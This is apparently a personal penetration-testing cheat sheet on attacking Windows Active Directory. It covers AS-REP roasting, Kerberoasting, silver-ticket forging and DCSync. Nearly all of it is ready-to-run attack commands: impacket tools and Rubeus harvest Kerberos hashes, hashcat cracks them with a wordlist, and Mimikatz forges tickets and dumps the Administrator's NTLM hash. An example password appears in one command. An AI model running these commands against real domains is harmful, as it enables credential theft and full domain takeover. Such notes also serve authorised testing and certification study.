## Active Directory

### AS-REP Roasting
If for some ridiculous reason the `Do not require Kerberos preauthentication` user setting is enabled, the door is open for querying for and receiving the users encrypted credentials, which we can then crack offline:
```bash
impacket-GetNPUsers -dc-ip 192.168.12.34  -request -outputfile hashes.asreproast our.domain/chumpasaurusUser
```
Then crack with Hashcat:
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
If we'd like to do the same thing but from Windows then:
```powershell
.\Rubeus.exe asreproast /nowrap
```
Copy the output to Kali and save it in a file called `hashes.asreproast`, and the command above will work just as well.

### Kerberoasting
For classic Kerberoasting from Windows:
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Same deal with copying the hashes back over to Kali:
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
For the same but from Kali:
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.12.34 our.domain/chumpasaurusUser
```

### Silver Tickets
If attempting to forge a silver ticket to hit a website, the following will work nicely from within Mimikatz:
```
mimikatz # kerberos::golden /sid:<current user SID> /domain:our.domain /ptt /target:target-site.our.domain /service:http /rc4:<NTLM hash of user whose privilege we want to assume> /user:chumpasaurusUser
```

### DC Sync
We can impersonate a Domain Controller and prompt others to perform a sync operation. This can allow us to retrieve the NTLM hash of any user. Via Mimikatz:
```
mimikatz # lsadump::dcsync /user:corp\Administrator
```
and via Linux:
```bash
impacket-secretsdump -just-dc-user Administrator corp.com/powerfulUser:"rubbishPassw0rd\!"@192.168.12.34
```
